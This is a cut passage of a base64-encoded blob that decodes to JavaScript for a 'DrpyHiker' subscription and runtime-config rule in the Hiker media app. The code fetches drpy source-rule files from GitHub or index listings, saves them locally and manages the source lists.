Y6Lev5b6EXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICBvbkNoYW5nZTogJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImRycHlIaWtlcl9zdWJfaW5wdXRcXFxcXFxcIiwgaW5wdXQpO1xcXFxuICAgICAgICB9KSxcXFxcbiAgICAgICAgaWQ6IFxcXFxcXFwiZHJweUhpa2VyX3N1Yl9pbnB1dFxcXFxcXFwiXFxcXG4gICAgfVxcXFxufSk7XFxcXG5cXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwi6K6i6ZiF5Zyw5Z2AXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZSxcXFxcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICBvbkNoYW5nZTogJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImRycHlIaWtlcl9zdWJ1cmxfaW5wdXRcXFxcXFxcIiwgaW5wdXQpO1xcXFxuICAgICAgICB9KSxcXFxcbiAgICAgICAgaWQ6IFxcXFxcXFwiZHJweUhpa2VyX3N1YnVybF9pbnB1dFxcXFxcXFwiXFxcXG4gICAgfVxcXFxufSk7XFxcXG5cXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuehruiupFxcXFxcXFwiLFxcXFxuICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChpZCkgPT4ge1xcXFxuICAgICAgICBsZXQgcGF0aCA9IGdldE15VmFyKFxcXFxcXFwiZHJweUhpa2VyX3N1Yl9pbnB1dFxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgbGV0IHVybCA9IGdldE15VmFyKFxcXFxcXFwiZHJweUhpa2VyX3N1YnVybF9pbnB1dFxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgbGV0IG5hbWUgPSBnZXRNeVZhcihcXFxcXFxcImRycHlIaWtlcl9zdWJuYW1lX2lucHV0XFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICBpZiAoIShwYXRoICYmIHVybCAmJiBuYW1lKSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/kuI3lj6/kuLrnqbpcXFxcXFxcIjtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsZXQgcnVsZSA9IGJhc2U2NEVuY29kZShcXFxcXFxcIua1t+mYlOinhueVjOinhOWImeWIhuS6q++8jOW9k+WJjeWIhuS6q+eahOaYr++8muWQiOmbhuinhOWImeiuoumYhe+/pWhvbWVfc3Vi77+lXFxcXFxcXCIgKyBuYW1lICsgXFxcXFxcXCJAQFxcXFxcXFwiICsgdXJsK2BAanM9JC5yZXF1aXJlKCdzdWJzY3JpYmU/cnVsZT0ke01ZX1JVTEUudGl0bGV9JykucGFyc2VVcmwoaW5wdXQsICcke2Jhc2U2NEVuY29kZShwYXRoKX0nKWApO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJydWxlOi8vXFxcXFxcXCIgKyBydWxlO1xcXFxuICAgIH0pLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbn0pO1xcXFxuc2V0UmVzdWx0KGxheW91dCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6Kej5p6Q6K6i6ZiFXFxcIixcXFwicGF0aFxcXCI6XFxcInN1YnNjcmliZVxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmZ1bmN0aW9uIGdlbmVyYXRlQ29uZmlnQnlHaXRodWIodXJsLCBwYXRoKSB7XFxcXG4gICAgbGV0IHJvcGUgPSB1cmwuc3BsaXQoXFxcXFxcXCIvXFxcXFxcXCIpLnNsaWNlKDMsIDUpLmpvaW4oXFxcXFxcXCIvXFxcXFxcXCIpO1xcXFxuICAgIGxldCBodG1sID0gZmV0Y2godXJsKTtcXFxcbiAgICBcXFxcbiAgICBsZXQganNvblRleHQgPSBwZGZoKGh0bWwsIFxcXFxcXFwiI3JlcG8tY29udGVudC1wamF4LWNvbnRhaW5lciYmc2NyaXB0JiZIdG1sXFxcXFxcXCIpO1xcXFxuICAgIFxcXFxuICAgIGxldCBqc29uID0gSlNPTi5wYXJzZShqc29uVGV4dCk7XFxcXG4gICAgbGV0IGxpc3QgPSBqc29uLnBheWxvYWQudHJlZS5pdGVtcztcXFxcbiAgICBsZXQgcnVsZXMgPSBbXTtcXFxcbiAgICBsZXQgY291bnQgPSAwO1xcXFxuICAgIGZvciAobGV0IGl0IG9mIGxpc3QpIHtcXFxcbiAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgIGxldCBuYW1lID0gaXQubmFtZTtcXFxcbiAgICAgICAgICAgIGxldCBzcGF0aCA9IGl0LnBhdGg7XFxcXG4gICAgICAgICAgICBpZiAoIW5hbWUuZW5kc1dpdGgoXFxcXFxcXCIuanNcXFxcXFxcIikpIGNvbnRpbnVlO1xcXFxuICAgICAgICAgICAgbmFtZSA9IG5hbWUuc2xpY2UoMCwgbmFtZS5sYXN0SW5kZXhPZihcXFxcXFxcIi5cXFxcXFxcIikpO1xcXFxuICAgICAgICAgICAgbGV0IHJ1bGUgPSBmZXRjaChgaHR0cHM6Ly9yYXcuZ2l0bWlycm9yLmNvbS8ke3JvcGV9L21hc3Rlci8ke3NwYXRofWApO1xcXFxuICAgICAgICAgICAgaWYgKCEoKCFydWxlIHx8ICFydWxlLmluY2x1ZGVzKFxcXFxcXFwicnVsZVxcXFxcXFwiKSkgJiYgIWZpbGVFeGlzdChwYXRoICsgaXQubmFtZSkpKSB7XFxcXG4gICAgICAgICAgICAgICAgd3JpdGVGaWxlKHBhdGggKyBpdC5uYW1lLCBydWxlKTtcXFxcbiAgICAgICAgICAgICAgICBydWxlcy5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgJ2tleSc6IGBoaXB5X2pzXyR7bmFtZX1gLFxcXFxuICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IGAke25hbWV9YCxcXFxcbiAgICAgICAgICAgICAgICAgICAgJ3R5cGUnOiAzLFxcXFxuICAgICAgICAgICAgICAgICAgICAnYXBpJzonLi4vbGlicy9kcnB5Mi5qcycsXFxcXG4gICAgICAgICAgICAgICAgICAgICdzZWFyY2hhYmxlJzogMSxcXFxcbiAgICAgICAgICAgICAgICAgICAgJ3F1aWNrU2VhcmNoJzogMSxcXFxcbiAgICAgICAgICAgICAgICAgICAgJ2ZpbHRlcmFibGUnOiAxLFxcXFxuICAgICAgICAgICAgICAgICAgICAnZXh0JzogXFxcXFxcXCIuL1xcXFxcXFwiICsgaXQubmFtZSxcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICBjb3VudCsrO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICBsb2coZS50b1N0cmluZygpKTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcbiAgICB3cml0ZUZpbGUocGF0aCArIFxcXFxcXFwiaW5kZXguanNvblxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeSh7c2l0ZXM6cnVsZXN9KSk7XFxcXG4gICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/miJDlip/mm7TmlrBcXFxcXFxcIiArIGNvdW50ICsgXFxcXFxcXCLkuKpcXFxcXFxcIjs7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdlbmVyYXRlQ29uZmlnQnlJbmRleCh1cmwsIHBhdGgpIHtcXFxcbiAgICBsZXQganNvbiA9IEpTT04ucGFyc2UocmVxdWVzdCh1cmwpKTtcXFxcbiAgICBsZXQgYXJyID0ganNvbi5zaXRlcztcXFxcbiAgICBsZXQgY291bnQgPSAwO1xcXFxuICAgIGxldCBpID0gMDtcXFxcbiAgICBmb3IgKGxldCBpdCBvZiBhcnIpIHtcXFxcbiAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgIGlmICgoU3RyaW5nKGl0LmFwaSkuaW5jbHVkZXMoXFxcXFxcXCJkcnB5Mi5taW4uanNcXFxcXFxcIikgfHwgU3RyaW5nKGl0LmFwaSkuaW5jbHVkZXMoXFxcXFxcXCJkcnB5Mi5qc1xcXFxcXFwiKSkpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgbmFtZSA9IGl0LmV4dC5lbmRzV2l0aChcXFxcXFxcIi5qc1xcXFxcXFwiKSA/IGRlY29kZVVSSUNvbXBvbmVudChpdC5leHQuc3BsaXQoXFxcXFxcXCIvXFxcXFxcXCIpLmF0KC0xKSkgOiAoaXQubmFtZSArIFxcXFxcXFwiLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGxldCBydWxlO1xcXFxuICAgICAgICAgICAgICAgIGlmIChTdHJpbmcoaXQuZXh0KS5zdGFydHNXaXRoKFxcXFxcXFwiaHR0cFxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBydWxlID0gcmVxdWVzdChpdC5leHQpO1xcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGUgPSByZXF1ZXN0KGpvaW5VcmwodXJsLCBpdC5leHQpKTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgaXQuZXh0ID0gXFxcXFxcXCIuL1xcXFxcXFwiICsgbmFtZTtcXFxcbiAgICAgICAgICAgICAgICBpZiAoIXJ1bGUgfHwgIXJ1bGUuaW5jbHVkZXMoXFxcXFxcXCJydWxlXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmICghZmlsZUV4aXN0KHBhdGggKyBuYW1lKSlcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGFyci5zcGxpY2UoaSwgMSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcXFxuICAgICAgICAgICAgICAgIH07XFxcXG4gICAgICAgICAgICAgICAgd3JpdGVGaWxlKHBhdGggKyBuYW1lLCBydWxlKTtcXFxcbiAgICAgICAgICAgICAgICBjb3VudCsrO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICBsb2coZS50b1N0cmluZygpKTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpKys7XFxcXG4gICAgfVxcXFxuICAgIHdyaXRlRmlsZShwYXRoICsgXFxcXFxcXCJpbmRleC5qc29uXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KGpzb24pKTtcXFxcbiAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+aIkOWKn+abtOaWsFxcXFxcXFwiICsgY291bnQgKyBcXFxcXFxcIuS4qlxcXFxcXFwiO1xcXFxufVxcXFxuJC5leHBvcnRzLnBhcnNlVXJsID0gZnVuY3Rpb24odXJsLCBwYXRoKSB7XFxcXG4gICAgcGF0aCA9IGJhc2U2NERlY29kZShwYXRoKTtcXFxcbiAgICBwYXRoID0gcGF0aC5lbmRzV2l0aChcXFxcXFxcIi9cXFxcXFxcIikgPyBwYXRoIDogcGF0aCArIFxcXFxcXFwiL1xcXFxcXFwiO1xcXFxuICAgIHRyeSB7XFxcXG4gICAgICAgIGlmICh1cmwuc3RhcnRzV2l0aChcXFxcXFxcImh0dHBzOi8vZ2l0aHViLmNvbS9oamRobngvXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gZ2VuZXJhdGVDb25maWdCeUdpdGh1Yih1cmwsIHBhdGgpO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgcmV0dXJuIGdlbmVyYXRlQ29uZmlnQnlJbmRleCh1cmwsIHBhdGgpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICBsb2coZS50b1N0cmluZygpKTtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwiZXJyb3I6XFxcXFxcXCIgKyBlLnRvU3RyaW5nKCk7XFxcXG4gICAgfVxcXFxufTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLov5DooYzml7bphY3nva7nrqHnkIZcXFwiLFxcXCJwYXRoXFxcIjpcXFwicnVudGltZUNvbmZpZ1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmNvbnN0IHNlYXJjaEFsbG93UGF0aCA9IFxcXFxcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9Mb3lEZ0lrL0RycHlIaWtlci9zZWFyY2hBbGxvdy5qc29uXFxcXFxcXCI7XFxcXG5sZXQgaXNQcmVwYXJlID0gZmFsc2U7XFxcXG5sZXQgY29uZmlncywgY3VycmVudENvbmZpZyA9IHt9LFxcXFxuICAgIHNvdXJjZUxpc3QsIGN1cnJlbnRTb3VyY2UsIHNlYXJjaEFsbG93ID0gW107XFxcXG5cXFxcbmZ1bmN0aW9uIGluaXQoY29uZmlnKSB7XFxcXG4gICAgaWYoIWNvbmZpZykgcmV0dXJuIG51bGw7XFxcXG4gICAgaWYgKCFjb25maWcucGF0aCkgcmV0dXJuIG51bGw7XFxcXG4gICAgdHJ5IHtcXFxcbiAgICAgICAgbGV0IGZpbGU7XFxcXG4gICAgICAgIGxldCBzb3VyY2VMaXN0ID0gW107XFxcXG4gICAgICAgIGlmIChjb25maWcucGF0aC5zdGFydHNXaXRoKFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiKSAmJiAoZmlsZSA9IG5ldyBqYXZhLmlvLkZpbGUoY29uZmlnLnBhdGgucmVwbGFjZShcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikpKS5pc0RpcmVjdG9yeSgpKSB7XFxcXG4gICAgICAgICAgICBzb3VyY2VMaXN0ID0gZ2VuZXJhdGVDb25maWdCeUxvY2FsKGZpbGUpO1xcXFxuICAgICAgICAgICAgY29uZmlnLnR5cGUgPSBcXFxcXFxcImxvY2FsRGlyXFxcXFxcXCI7XFxcXG4gICAgICAgIH0gZWxzZSBpZiAoY29uZmlnLnBhdGguc3RhcnRzV2l0aChcXFxcXFxcImh0dHBzOi8vZ2l0aHViLmNvbVxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgc291cmNlTGlzdCA9IGdlbmVyYXRlQ29uZmlnQnlHaXRodWIoY29uZmlnLnBhdGgpO1xcXFxuICAgICAgICAgICAgY29uZmlnLnR5cGUgPSBcXFxcXFxcImdpdGh1YkRpclxcXFxcXFwiO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgbGV0IGpzb24gPSBKU09OLnBhcnNlKHRvQ29ycmVjdEpTT05TdHJpbmcoZmV0Y2goY29uZmlnLnBhdGgpKSB8fCBcXFxcXFxcInt9XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgaWYgKCFBcnJheS5pc0FycmF5KGpzb24uc2l0ZXMpIHx8ICFqc29uLnNpdGVzLmxlbmd0aCkge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBudWxsO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgc291cmNlTGlzdCA9IGZpbHRlck90aGVyKGpzb24uc2l0ZXMpO1xcXFxuICAgICAgICAgICAgY29uZmlnLnR5cGUgPSBcXFxcXFxcImluZGV4XFxcXFxcXCI7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgZmlsZSA9IHZvaWQgMDtcXFxcbiAgICAgICAgbGV0IGN1cnJlbnRTb3VyY2UsIHNlYXJjaEFsbG93O1xcXFxuICAgICAgICBpZiAoY29uZmlnLmNLZXkpIHtcXFxcbiAgICAgICAgICAgIGN1cnJlbnRTb3VyY2UgPSBzb3VyY2VMaXN0LmZpbmQodiA9PiB2LmtleSA9PT0gY29uZmlnLmNLZXkpO1xcXFxuICAgICAgICAgICAgaWYgKCFjdXJyZW50U291cmNlKSB7XFxcXG4gICAgICAgICAgICAgICAgY3VycmVudFNvdXJjZSA9IHNvdXJjZUxpc3RbMF07XFxcXG4gICAgICAgICAgICAgICAgLy9jdXJyZW50Q29uZmlnLmNLZXkgPSBzb3VyY2VMaXN0WzBdLmtleTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIGN1cnJlbnRTb3VyY2UgPSBzb3VyY2VMaXN0WzBdO1xcXFxuICAgICAgICAgICAgLy9jb25maWcuY0tleSA9IHNvdXJjZUxpc3RbMF0ua2V5O1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICBzZWFyY2hBbGxvdyA9IEpTT04ucGFyc2UoZmV0Y2goc2VhcmNoQWxsb3dQYXRoKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICBkZWxldGVGaWxlKHNlYXJjaEFsbG93UGF0aCk7XFxcXG4gICAgICAgICAgICBzZWFyY2hBbGxvdyA9IFtdO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiB7XFxcXG4gICAgICAgICAgICBjdXJyZW50U291cmNlLFxcXFxuICAgICAgICAgICAgc2VhcmNoQWxsb3csXFxcXG4gICAgICAgICAgICBzb3VyY2VMaXN0XFxcXG4gICAgICAgIH07XFxcXG4gICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICBsb2coZS50b1N0cmluZygpKTtcXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIG51bGw7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdlbmVyYXRlQ29uZmlnQnlMb2NhbChkaXJGaWxlKSB7XFxcXG4gICAgbGV0IGxpc3QgPSBkaXJGaWxlLmxpc3RGaWxlcygpO1xcXFxuICAgIGxldCBydWxlcyA9IFtdO1xcXFxuICAgIGZvciAobGV0IGl0IG9mIGxpc3QpIHtcXFxcbiAgICAgICAgbGV0IG5hbWUgPSBTdHJpbmcoaXQuZ2V0TmFtZSgpKTtcXFxcbiAgICAgICAgbGV0IHBhdGggPSBpdC5nZXRQYXRoKCk7XFxcXG4gICAgICAgIGlmICghbmFtZS5lbmRzV2l0aChcXFxcXFxcIi5qc1xcXFxcXFwiKSB8fCBpdC5pc0RpcmVjdG9yeSgpKSBjb250aW51ZTtcXFxcbiAgICAgICAgbmFtZSA9IG5hbWUuc2xpY2UoMCwgbmFtZS5sYXN0SW5kZXhPZihcXFxcXFxcIi5cXFxcXFxcIikpO1xcXFxuICAgICAgICBydWxlcy5wdXNoKHtcXFxcbiAgICAgICAgICAgICdrZXknOiBgaGlweV9qc18ke25hbWV9YCxcXFxcbiAgICAgICAgICAgICduYW1lJzogYCR7bmFtZX1gLFxcXFxuICAgICAgICAgICAgJ3R5cGUnOiAzLFxcXFxuICAgICAgICAgICAgJ3NlYXJjaGFibGUnOiAxLFxcXFxuICAgICAgICAgICAgJ3F1aWNrU2VhcmNoJzogMSxcXFxcbiAgICAgICAgICAgICdmaWx0ZXJhYmxlJzogMSxcXFxcbiAgICAgICAgICAgICdleHQnOiBgJHtwYXRofWAsXFxcXG4gICAgICAgIH0pO1xcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gcnVsZXM7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdlbmVyYXRlQ29uZmlnQnlHaXRodWIodXJsKSB7XFxcXG4gICAgLy91cmw9dXJsLnJlcGxhY2UoLygjR0lUSFVCIykkLyxcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICBsZXQgcm9wZSA9IHVybC5zcGxpdChcXFxcXFxcIi9cXFxcXFxcIikuc2xpY2UoMywgNSkuam9pbihcXFxcXFxcIi9cXFxcXFxcIik7XFxcXG4gICAgbGV0IGh0bWwgPSBmZXRjaCh1cmwpO1xcXFxuICAgIGxldCBqc29uVGV4dCA9IHBkZmgoaHRtbCwgXFxcXFxcXCIjcmVwby1jb250ZW50LXBqYXgtY29udGFpbmVyJiZzY3JpcHQmJkh0bWxcXFxcXFxcIik7XFxcXG4gICAgbGV0IGpzb24gPSBKU09OLnBhcnNlKGpzb25UZXh0KTtcXFxcbiAgICBsZXQgbGlzdCA9IGpzb24ucGF5bG9hZC50cmVlLml0ZW1zO1xcXFxuICAgIGxldCBydWxlcyA9IFtdO1xcXFxuICAgIGZvciAobGV0IGl0IG9mIGxpc3QpIHtcXFxcbiAgICAgICAgbGV0IG5hbWUgPSBpdC5uYW1lO1xcXFxuICAgICAgICBsZXQgcGF0aCA9IGl0LnBhdGg7XFxcXG4gICAgICAgIGlmICghbmFtZS5lbmRzV2l0aChcXFxcXFxcIi5qc1xcXFxcXFwiKSkgY29udGludWU7XFxcXG4gICAgICAgIG5hbWUgPSBuYW1lLnNsaWNlKDAsIG5hbWUubGFzdEluZGV4T2YoXFxcXFxcXCIuXFxcXFxcXCIpKTtcXFxcbiAgICAgICAgcnVsZXMucHVzaCh7XFxcXG4gICAgICAgICAgICAna2V5JzogYGhpcHlfanNfJHtuYW1lfWAsXFxcXG4gICAgICAgICAgICAnbmFtZSc6IGAke25hbWV9YCxcXFxcbiAgICAgICAgICAgICd0eXBlJzogMyxcXFxcbiAgICAgICAgICAgICdzZWFyY2hhYmxlJzogMSxcXFxcbiAgICAgICAgICAgICdxdWlja1NlYXJjaCc6IDEsXFxcXG4gICAgICAgICAgICAnZmlsdGVyYWJsZSc6IDEsXFxcXG4gICAgICAgICAgICAnZXh0JzogYGh0dHBzOi8vcmF3LmdpdG1pcnJvci5jb20vJHtyb3BlfS9tYXN0ZXIvJHtwYXRofWAsXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICAvKlxcXFxuICAgICAgICBodHRwczovL2dpdGh1Yi5jb20vaGpkaG54L2hpcHktc2VydmVyL3RyZWUvbWFzdGVyL2FwcC90NC9maWxlcy9kcnB5X2pzXFxcXG4gICAgICAgIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9oamRobngvaGlweS1zZXJ2ZXIvbWFzdGVyL2FwcC90NC9maWxlcy9kcnB5X2pzLzM2MCVFNSVCRCVCMSVFOCVBNyU4NiU1QiVFNSVBRSU5OCU1RC5qcyovXFxcXG4gICAgfVxcXFxuICAgIHJldHVybiBydWxlcztcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gcHJlcGFyZShjb25maWcpIHtcXFxcbiAgICBsZXQgZGF0YSA9IGluaXQoY29uZmlnKTtcXFxcbiAgICBpZiAoIWRhdGEpIHJldHVybiBmYWxzZTtcXFxcbiAgICBjdXJyZW50U291cmNlID0gZGF0YS5jdXJyZW50U291cmNlO1xcXFxuICAgIHNlYXJjaEFsbG93ID0gZGF0YS5zZWFyY2hBbGxvdztcXFxcbiAgICBzb3VyY2VMaXN0ID0gZGF0YS5zb3VyY2VMaXN0O1xcXFxuICAgIGN1cnJlbnRDb25maWcgPSBjb25maWc7XFxcXG4gICAgcmV0dXJuIHRydWU7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGZpbHRlck90aGVyKGxpc3QpIHtcXFxcbiAgICByZXR1cm4gbGlzdC5maWx0ZXIoaXQgPT4gU3RyaW5nKGl0LmFwaSkuaW5jbHVkZXMoXFxcXFxcXCJkcnB5Mi5taW4uanNcXFxcXFxcIikgfHwgU3RyaW5nKGl0LmFwaSkuaW5jbHVkZXMoXFxcXFxcXCJkcnB5Mi5qc1xcXFxcXFwiKSlcXFxcbn1cXFxcblxcXFxuXFxcXG5mdW5jdGlvbiBnZXRDdXJyZW50Q29uZmlnKCkge1xcXFxuICAgIHJldHVybiBjdXJyZW50Q29uZmlnfHx7fTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gc2V0Q3VycmVudENvbmZpZyhjb25maWcpIHtcXFxcbiAgICBsZXQgY3BhdGggPSAoY3VycmVudENvbmZpZyB8fCB7fSkucGF0aDtcXFxcbiAgICBpZiAocHJlcGFyZShjb25maWcpKSB7XFxcXG4gICAgICAgIHN0b3JhZ2UwLnNldEl0ZW0oXFxcXFxcXCJjdXJyZW50Q29uZmlnXFxcXFxcXCIsIGNvbmZpZyk7XFxcXG4gICAgICAgIGlmIChjcGF0aCAhPSBjb25maWcucGF0aCkge1xcXFxuICAgICAgICAgICAgZGVsZXRlRmlsZShzZWFyY2hBbGxvd1BhdGgpO1xcXFxuICAgICAgICAgICAgc2VhcmNoQWxsb3cgPSBbXTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpc1ByZXBhcmUgPSB0cnVlO1xcXFxuICAgICAgICByZXR1cm4gdHJ1ZTtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxcXG4gICAgfVxcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBmaW5kU291cmNlKGtleSkge1xcXFxuICAgIGxldCBzID0gc291cmNlTGlzdC5maW5kKHYgPT4gdi5rZXkgPT09IGtleSk7XFxcXG4gICAgaWYgKHMpIHtcXFxcbiAgICAgICAgcy5leHQgPSBnZXRBYnNvbHV0ZVBhdGgoU3RyaW5nKHMuZXh0KSk7XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiBzO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBnZXRDdXJyZW50U291cmNlKCkge1xcXFxuICAgIHJldHVybiBjdXJyZW50U291cmNlO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBnZXRDdXJyZW50U291cmNlUGF0aCgpIHtcXFxcbiAgICBsZXQgcGF0aCA9IFN0cmluZyhjdXJyZW50U291cmNlLmV4dCk7XFxcXG4gICAgcmV0dXJuIGdldEFic29sdXRlUGF0aChwYXRoKTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gZ2V0QWJzb2x1dGVQYXRoKHBhdGgpIHtcXFxcbiAgICBwYXRoID0gU3RyaW5nKHBhdGgpO1xcXFxuICAgIGlmIChwYXRoLnN0YXJ0c1dpdGgoXFxcXFxcXCJodHRwXFxcXFxcXCIpIHx8IHBhdGguc3RhcnRzV2l0aChcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIikpIHtcXFxcbiAgICAgICAgcmV0dXJuIHBhdGg7XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgICAgcmV0dXJuIGpvaW5VcmwoY3VycmVudENvbmZpZy5wYXRoLCBwYXRoKTtcXFxcbiAgICB9XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIHNldEN1cnJlbnRTb3VyY2Uoa2V5KSB7XFxcXG4gICAgbGV0IHNvdXJjZSA9IHNvdXJjZUxpc3QuZmluZCh2ID0+IHYua2V5ID09PSBrZXkpO1xcXFxuICAgIGlmIChzb3VyY2UpIHtcXFxcbiAgICAgICAgY3VycmVudENvbmZpZy5jS2V5ID0ga2V5O1xcXFxuICAgICAgICBzdG9yYWdlMC5zZXRJdGVtKFxcXFxcXFwiY3VycmVudENvbmZpZ1xcXFxcXFwiLCBjdXJyZW50Q29uZmlnKTtcXFxcbiAgICAgICAgY3VycmVudFNvdXJjZSA9IHNvdXJjZTtcXFxcbiAgICAgICAgcmV0dXJuIHRydWU7XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiBmYWxzZTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gZ2V0Q2FuU2VhcmNoU291cmNlKCkge1xcXFxuICAgIHJldHVybiBzb3VyY2VMaXN0LmZpbHRlcih2ID0+IHYuc2VhcmNoYWJsZSA9PT0gdW5kZWZpbmVkIHx8IHYuc2VhcmNoYWJsZSk7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdldEFsbFNvdXJjZSgpIHtcXFxcbiAgICByZXR1cm4gc291cmNlTGlzdC5zbGljZSgpO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBnZXRBbGxTb3VyY2VzKCkge1xcXFxuICAgIHJldHVybiBzb3VyY2VMaXN0O1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBnZXRTZWFyY2hBbGxvdygpIHtcXFxcbiAgICByZXR1cm4gc2VhcmNoQWxsb3c7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIHNldFNlYXJjaEFsbG93KCkge1xcXFxuICAgIGlmIChBcnJheS5pc0FycmF5KHNlYXJjaEFsbG93KSkge1xcXFxuICAgICAgICBzYXZlRmlsZShzZWFyY2hBbGxvd1BhdGgsIEpTT04uc3RyaW5naWZ5KHNlYXJjaEFsbG93KSk7XF